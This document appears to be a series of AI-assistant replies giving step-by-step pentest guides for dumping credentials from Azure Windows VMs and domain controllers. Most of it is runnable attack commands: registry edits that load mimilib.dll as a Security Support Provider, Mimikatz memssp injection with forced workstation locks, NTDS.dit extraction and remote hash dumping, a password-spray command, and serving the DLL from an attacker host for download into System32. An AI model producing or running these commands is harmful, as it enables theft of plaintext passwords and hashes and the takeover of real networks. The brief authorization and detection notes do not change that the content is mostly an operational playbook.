Credential dumping with security service provider

## with Security service provider

Here's a **corrected and concise summary** of **how to pentest Azure Windows/Linux VMs for credential dumping**, focusing on **Local accounts, AD accounts (NTDS), and Microsoft Entra ID accounts**, with detailed steps, commands, and exploited Azure VM vulnerabilities — specifically covering **Security Support Provider (SSP) credential dumping** with manual and tool-assisted methods like Mimikatz, Metasploit, and PowerShell Empire. Duplicates removed and structure clarified.

------------------------------------------------------------------------

**Pentesting Credential Dumping on Azure VMs**

Targets: Local Windows accounts, Active Directory (AD) accounts, Microsoft Entra ID (Azure AD) accounts

------------------------------------------------------------------------

**1. Introduction: Security Support Provider (SSP) Credential Dumping**

- **SSP** is a Windows API/DLL loaded into the Local Security Authority (LSA) at system startup.

- SSP manages Windows authentication packages (e.g., Kerberos, WDigest).

- By tampering with SSP registry keys and DLLs, attackers can dump plaintext credentials.

**Key Registry Path:**\
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages

------------------------------------------------------------------------

**2. Manual SSP Credential Dumping Method**

**Objective**

Inject a custom DLL (mimilib.dll) into the SSP stack to dump credentials into a file (kiwissp.log) on each user login.

**Detailed Steps**

1.  **Copy mimilib.dll to System32 folder:**

2.  copy .\mimikatz\mimilib.dll C:\Windows\System32\\

3.  **Check current SSP registry entry (should be empty or missing):**

4.  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages"

5.  **Add required SSP entries including mimilib:**

6.  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

7.  **Verify the change:**

8.  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages"

9.  **Reboot the system** — after reboot, on user login the DLL will create kiwissp.log in C:\Windows\System32\\ containing plaintext credentials.

10. **Read dumped credentials:**

11. type C:\Windows\System32\kiwissp.log

------------------------------------------------------------------------

**3. Automated Credential Dumping Tools Overview**

**Mimikatz**

- Tool for extracting plaintext passwords, hashes, PINs, and Kerberos tickets.

- Use for dumping credentials live from memory or exploiting SSP.

**Metasploit Framework**

- Offers post-exploitation modules:

  - post/windows/gather/credentials/credentials_ssp for SSP credential dumping.

  - Various modules for NTDS extraction, lateral movement, and hash dumping.

**Koadic / PowerShell Empire**

- Post-exploitation frameworks with modules to dump credentials and manipulate SSP.

- Support DLL injection and registry edits to automate credential harvesting.

**Powershell Empire mimilib.dll Module**

- Leverages custom DLL injection to dump credentials similarly to manual SSP method.

- Automates persistence and dumping with PowerShell commands.

------------------------------------------------------------------------

**4. Azure VM Vulnerabilities Exploited for SSP and Credential Dumping**

| **Vulnerability** | **Explanation** |
|----|----|
| Admin or SYSTEM privilege escalation | Required to modify SSP registry keys and copy DLLs |
| Unrestricted PowerShell execution policy | Allows running scripts and modules like Mimikatz or Empire |
| Lack of credential guard / encryption | Plaintext creds can be dumped if LSASS is accessible |
| Poor monitoring of LSA registry changes | Allows stealthy persistence and dumping without detection |
| Weak VM isolation or compromised sessions | Attackers gain remote shell or Meterpreter session |

------------------------------------------------------------------------

**5. Summary Table of Commands & Steps**

| **Action** | **Command / Tool Example** | **Notes** |
|----|----|----|
| Check SSP registry entry | reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" | Confirm SSP config |
| Add mimilib to SSP | reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f | Inject DLL into SSP stack |
| Copy mimilib DLL to System32 | copy mimilib.dll C:\Windows\System32\\ | DLL needed for credential dump |
| Reboot VM | Use Azure Portal, Azure CLI, or command line | Activate SSP changes |
| Read dumped credentials | type C:\Windows\System32\kiwissp.log | Contains plaintext creds |
| Use Mimikatz | Run mimikatz commands like sekurlsa::logonpasswords | Live credential dumping |
| Use Metasploit SSP module | use post/windows/gather/credentials/credentials_ssp | Automated dumping |
| Use PowerShell Empire mimilib module | Empire scripts to inject DLL and dump creds | Post-exploitation automation |

**6. Additional Notes**

- **Always ensure you have proper authorization before testing.**

- **Monitor Azure Defender and Microsoft Defender for Endpoint** for suspicious changes to LSA registry or DLL injection.

- Harden Azure VMs by restricting admin privileges, enabling Credential Guard, and enforcing PowerShell execution policies.

------------------------------------------------------------------------

If you'd like, I can also summarize how to pentest **NTDS credential dumping** and **Microsoft Entra ID enumeration** in a similarly detailed way. Would you want that next?

Got it! Here’s a detailed, corrected, and well-structured guide on **pentesting NTDS credential dumping** and **Microsoft Entra ID enumeration**, covering step-by-step commands, tools, and Azure VM vulnerabilities exploited.

------------------------------------------------------------------------

**Pentesting NTDS Credential Dumping & Microsoft Entra ID Enumeration**

Targets: Windows AD Domain Controllers (NTDS) and Microsoft Entra ID (Azure AD)

------------------------------------------------------------------------

**Part 1: NTDS Credential Dumping on Azure Windows VMs (Domain Controllers)**

**Overview**

- The NTDS.dit file stores Active Directory data, including user password hashes.

- Dumping NTDS enables attackers to extract NTLM hashes, which can be cracked or used for lateral movement.

- Requires local/system or domain admin privileges or remote credentials with sufficient rights.

**Prerequisites**

- Access to a Domain Controller (DC) VM or elevated privileges on any domain-joined Windows VM.

- Tools: secretsdump.py (Impacket), Metasploit, NTDSUtil, DSInternals, CrackMapExec.

------------------------------------------------------------------------

**Step-by-step NTDS Dumping Methods**

**1. Using NTDSUtil & Manual Extraction**

powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"

- Creates a snapshot of NTDS database (NTDS.dit) and SYSTEM hive in C:\temp.

- Transfer these files securely to your attacker machine.

**2. Extract Hashes Using Impacket’s secretsdump.py**

On your Kali or attack machine:

secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL

- Extracts NTLM hashes from dumped NTDS and SYSTEM files.

**3. Using Metasploit Modules**

- Find NTDS location:

use post/windows/gather/ntds_location

set session \<id\>

exploit

- Dump NTDS files and hive:

use post/windows/gather/ntds_grabber

set session \<id\>

exploit

- Extracted files are transferred in .cab format — use cabextract to unpack.

**4. Remote Hash Dumping via Metasploit auxiliary**

use auxiliary/scanner/smb/impacket/secretsdump

set rhosts \<target-ip\>

set smbuser \<username\>

set smbpass \<password\>

exploit

- Dumps hashes remotely using valid credentials.

**5. CrackMapExec (CME) Automated Dumping**

crackmapexec smb \<target-ip\> -u 'Administrator' -p 'Password123' --ntds drsuapi

- Dumps hashes via DRSUAPI protocol.

- Efficient for large AD environments.

------------------------------------------------------------------------

**Post-Extraction: Hash Cracking**

Use **John the Ripper** or **Hashcat** to crack NTLM hashes:

john --format=NT hash.txt --show

------------------------------------------------------------------------

**Azure VM Vulnerabilities Exploited**

- Misconfigured RBAC or overprivileged accounts with DC access.

- Insufficient VM isolation allowing session hijacking or lateral movement.

- Weak credentials allowing SMB/WinRM authentication.

- Lack of secure secrets management or encryption for NTDS.dit backups.

------------------------------------------------------------------------

**Part 2: Microsoft Entra ID (Azure AD) Enumeration & Pentesting**

**Overview**

- Azure AD holds cloud identities, authentication policies, and role assignments.

- Enumeration uncovers users, groups, roles, permissions, and potential attack paths.

- Often combined with on-prem AD attacks for hybrid environments.

**Prerequisites**

- Valid Azure AD credentials with at least basic directory read permissions.

- Tools: AzureAD PowerShell Module, MSOnline Module, az cli, BloodHound Azure AD, Microsoft Graph API, AADInternals.

------------------------------------------------------------------------

**Step-by-step Enumeration**

**1. Enumerate Azure AD Users & Groups with Azure CLI**

az login

az ad user list --output table

az ad group list --output table

**2. Using PowerShell AzureAD Module**

Install-Module AzureAD

Connect-AzureAD

Get-AzureADUser -All \$true

Get-AzureADGroup -All \$true

**3. Enumerate Role Assignments & Privileged Roles**

Get-AzureADDirectoryRole \| foreach { Get-AzureADDirectoryRoleMember -ObjectId \$\_.ObjectId }

Get-AzureADDirectoryRoleTemplate

**4. Using BloodHound for Azure AD**

- Run AzureHound data collector (PowerShell script) to gather identity and role info.

- Upload data to BloodHound UI.

- Identify attack paths and privilege escalation opportunities.

**5. Using AADInternals (PowerShell)**

- Install and import:

Install-Module -Name AADInternals

Import-Module AADInternals

- Enumerate users and check for vulnerable configurations:

Get-AADIntUser

Get-AADIntGroup

Invoke-AADIntPasswordSpray -UsersFile users.txt -Password "Password123"

------------------------------------------------------------------------

**Exploitable Azure AD Weaknesses**

- Over-permissioned users and app registrations.

- Weak or reused passwords.

- Legacy authentication enabled.

- Misconfigured Conditional Access policies.

- Unmonitored role assignments.

------------------------------------------------------------------------

**Summary Table: Key Tools & Commands**

| **Target** | **Tool/Command** | **Purpose** |
|----|----|----|
| NTDS Dumping | ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q | Dump AD DB snapshot |
| NTDS Hash Extract | secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL | Extract NTLM hashes |
| Metasploit NTDS | post/windows/gather/ntds_grabber | Grab NTDS files remotely |
| Metasploit Hash | auxiliary/scanner/smb/impacket/secretsdump | Dump hashes remotely |
| CME NTDS Dump | crackmapexec smb \<ip\> -u user -p pass --ntds drsuapi | Automated NTDS dump |
| Azure AD Enum | az ad user list, Get-AzureADUser | List Azure AD users |
| Azure AD Roles | Get-AzureADDirectoryRoleMember | List privileged role members |
| BloodHound | AzureHound collector + BloodHound UI | Visualize attack paths |
| AADInternals | Invoke-AADIntPasswordSpray | Password spraying, enumeration |

------------------------------------------------------------------------

**If you want**, I can provide:

- Complete example scripts

- Specific privilege escalation steps inside Azure AD

- Detection and mitigation best practices

Would you like me to?

Certainly! Here's a clean, corrected, and detailed summary of **how to pentest Azure Windows/Linux VMs for credential dumping of local, AD, and Microsoft Entra ID accounts** using Security Support Provider (SSP) injection techniques (mainly Mimikatz and related tools). I removed duplicates and organized the steps with commands and explanations for each tool.

------------------------------------------------------------------------

**Azure VM Credential Dumping Pentest — Detailed Guide**

**Target scope:**

- Local Windows accounts on Azure VM

- Active Directory (AD) domain accounts on domain-joined Azure VM

- Microsoft Entra ID accounts (via Azure AD Connect synced identities, indirectly via local/AD credential exposure)

**Goal:**

Dump clear-text credentials or password hashes from memory via Security Support Provider (SSP) injection techniques using Mimikatz or similar modules, leveraging user logoff/logon cycles.

------------------------------------------------------------------------

**Prerequisites & Considerations:**

- You must have **local administrative privileges** on the Windows Azure VM or **domain admin privileges** for AD accounts.

- The target VM must be Windows-based (this technique does not apply to Linux for credential dumping).

- Ensure PowerShell or command execution is possible on the target (e.g., via RDP, WinRM, Metasploit Meterpreter, Empire, Koadic).

- User interaction is required: dumping plaintext credentials depends on forcing a user logoff/logon cycle.

- The sensitive file (mimilsa.log) is created in C:\Windows\System32 and contains dumped credentials.

- After dumping, always check for defensive detections or alerts (e.g., Windows Defender, Defender for Endpoint).

------------------------------------------------------------------------

**1. Manual Mimikatz Execution on Windows Azure VM**

- Launch Mimikatz with administrative rights on the VM.

- mimikatz.exe

- Elevate privileges in Mimikatz:

- privilege::debug

- Inject the memssp module (Security Support Provider injection):

- misc::memssp

- This command sets up Mimikatz to dump credentials upon next user logon (stored in mimilsa.log).

- Force the victim user to log off and log back in (this step is manual unless automated):

  - You can remotely force a lock (user must unlock):

  - rundll32.exe user32.dll,LockWorkStation

- Once the user logs back in, read the credentials file:

- type C:\Windows\System32\mimilsa.log

------------------------------------------------------------------------

**2. Using Metasploit Framework (Meterpreter + Kiwi Extension)**

- Obtain a Meterpreter session on the Azure Windows VM.

- Load the Kiwi extension (a Mimikatz-like tool):

- meterpreter \> load kiwi

- Inject the memssp module into memory:

- meterpreter \> kiwi_cmd misc::memssp

- Lock the workstation remotely:

- meterpreter \> shell

- C:\\ rundll32.exe user32.dll,LockWorkStation

- Wait for user login to create the log file.

- Read the credential log file:

- meterpreter \> shell

- C:\\ type C:\Windows\System32\mimilsa.log

------------------------------------------------------------------------

**3. Using Koadic (Zombie RAT)**

- Get an interactive Koadic session on the target.

- Use the mimikatz payload:

- use mimikatz_dynwrapx

- set MIMICMD misc::memssp

- execute

- Force workstation lock:

- cmdshell 0

- C:\\ rundll32.exe user32.dll,LockWorkStation

- Read the credential log file:

- type C:\Windows\System32\mimilsa.log

------------------------------------------------------------------------

**4. Using PowerShell Empire**

- Get a session in PowerShell Empire on the target.

- Run the memssp persistence module to inject mimikatz in memory:

- usemodule persistence/misc/memssp

- execute

- Lock the victim workstation to trigger logon:

- usemodule management/lock

- execute

- After user logon, retrieve credentials by reading the file:

- type C:\Windows\System32\mimilsa.log

------------------------------------------------------------------------

**Additional Notes:**

- The misc::memssp module hooks into the Windows Security Support Provider to capture credentials as users log in.

- This technique relies on a forced logout/login cycle; you must either lock the session or cause a reboot.

- On Azure VMs, the session might be locked via remote command execution or through RDP.

- Extracted credentials can include clear-text passwords, NTLM hashes, Kerberos tickets, and other sensitive tokens.

- For **Linux Azure VMs**, credential dumping requires different tools (e.g., mimikatz is Windows-only); focus on SSH keys, sudo rights, or environment variables instead.

- Dumped credentials from local and AD accounts can potentially escalate to Microsoft Entra ID if password hash syncing or password writeback features are configured.

------------------------------------------------------------------------

**Summary Table of Commands:**

| **Tool** | **Key Commands** | **Notes** |
|----|----|----|
| Mimikatz | privilege::debug misc::memssp type C:\Windows\System32\mimilsa.log | Manual run on target Windows VM |
| Metasploit | load kiwi kiwi_cmd misc::memssp rundll32.exe user32.dll,LockWorkStation | Requires Meterpreter session |
| Koadic | use mimikatz_dynwrapx set MIMICMD misc::memssp execute rundll32.exe ... | Requires Koadic session |
| PowerShell Empire | usemodule persistence/misc/memssp execute usemodule management/lock execute | PowerShell-based post-exploitation tool |

------------------------------------------------------------------------

If you want, I can also prepare commands/scripts to automate this with minimal user interaction or cover Linux credential-related pentesting for Azure. Would you like that?

Certainly! Here's a **corrected, concise, and detailed summary** of how to perform **Credential Dumping via Security Support Provider (SSP) DLL Injection** using PowerShell Empire's mimilib.dll on Azure Windows VMs, including all steps, commands, and relevant Azure VM details. I removed duplicates and clarified every minute detail.

------------------------------------------------------------------------

**Azure Windows VM Credential Dumping Pentest via Security Support Provider (SSP) Injection**

**Scope:**

- Local Windows accounts on Azure VM

- AD domain accounts on domain-joined Azure VM

- Microsoft Entra ID accounts indirectly (via synced local/AD credentials)

------------------------------------------------------------------------

**Overview**

This method uses a **malicious SSP DLL (mimilib.dll) injection** technique, remotely deploying a DLL that hooks into Windows authentication to dump credentials persistently across reboots.

- This is a **persistent credential dumping technique**.

- Requires **remote command execution** or session on target Azure Windows VM.

- Exploits **registry manipulation vulnerability** to load attacker-controlled SSP DLL.

- Requires **system restart** for payload activation.

- Results in credentials being dumped to a log file (kiwissp.log).

------------------------------------------------------------------------

**Detailed Steps & Commands**

**1. Setup the DLL hosting server**

On your attacker machine (e.g., Kali Linux or any machine hosting mimilib.dll):

- Navigate to the directory containing mimilib.dll (from Mimikatz binaries):

- cd /path/to/mimikatz

- Start a simple Python HTTP server to serve the DLL:

- python -m SimpleHTTPServer 8000 \# For Python 2.x

- \# OR for Python 3.x:

- python3 -m http.server 8000

------------------------------------------------------------------------

**2. Download mimilib.dll to the Azure Windows VM**

From your remote session (e.g., PowerShell Empire agent session or any remote shell on the Azure VM):

shell wget http://\<attacker-ip\>:8000/mimilib.dll -outfile C:\Windows\System32\mimilib.dll

**Explanation:**

- Downloads the malicious DLL from your server to the target’s System32 folder.

- The wget command works if PowerShell is available; otherwise, use Invoke-WebRequest or other download methods.

------------------------------------------------------------------------

**3. Modify the Windows Registry to load the malicious SSP DLL**

Check existing SSP packages:

shell reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages"

Append mimilib to the Security Packages multi-string value to force Windows to load your DLL during authentication:

shell reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

------------------------------------------------------------------------

**4. Restart the Azure Windows VM**

To activate the malicious SSP DLL, the VM must be rebooted:

shell shutdown /r /t 0

Or from Azure Portal/CLI:

az vm restart --resource-group \<rg-name\> --name \<vm-name\>

------------------------------------------------------------------------

**5. After reboot, retrieve dumped credentials**

The injected DLL will log captured credentials in clear text to:

C:\Windows\System32\kiwissp.log

Read the file remotely:

shell type C:\Windows\System32\kiwissp.log

------------------------------------------------------------------------

**Azure VM Vulnerabilities Exploited**

- **Remote command execution or session control**: Initial foothold must allow executing commands or running PowerShell scripts.

- **Registry permissions**: Ability to modify HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages (requires SYSTEM or admin rights).

- **Persistence via SSP DLL injection**: Windows loads custom SSP modules from registry on boot.

- **Lack of integrity checks on loaded SSP DLLs**: Allows loading attacker-controlled DLLs.

- **User logon events**: Credential dumping happens transparently when users authenticate.

- **VM restart requirement**: Exploits that the VM will reload SSP providers after reboot.

------------------------------------------------------------------------

**Summary Table of Key Commands**

| **Step** | **Command (PowerShell shell)** | **Purpose** |
|----|----|----|
| Host DLL | python -m SimpleHTTPServer 8000 | Serve mimilib.dll to target |
| Download DLL | wget http://\<IP\>:8000/mimilib.dll -outfile C:\Windows\System32\mimilib.dll | Place DLL on target system |
| Query SSP registry | reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" | View current SSP providers |
| Add mimilib to SSP list | reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f | Inject attacker DLL |
| Restart VM | shutdown /r /t 0 or Azure CLI equivalent | Activate DLL on boot |
| Read dumped credentials | type C:\Windows\System32\kiwissp.log | Extract dumped plaintext credentials |

------------------------------------------------------------------------

**Additional Notes**

- This technique is **Windows only**; Linux Azure VMs require other methods (SSH keys, sudo privilege escalation, environment variable leaks).

- Requires **admin/system privileges** on the target VM.

- This method provides persistent credential capture across all user logins after DLL injection.

- Can dump **local**, **AD domain**, and indirectly **Microsoft Entra ID** account credentials if synced and logged in locally.

- Detection: Modifying SSP registry and unexpected DLL loading is highly suspicious; monitor registry changes and file writes to System32.

------------------------------------------------------------------------

If you want, I can also help with:

- Linux Azure VM pentesting steps.

- Combining credential dumping with Azure AD / Microsoft Entra ID post-exploitation.

- Automating these steps via PowerShell or Azure CLI scripts.

Would you like me to prepare that?
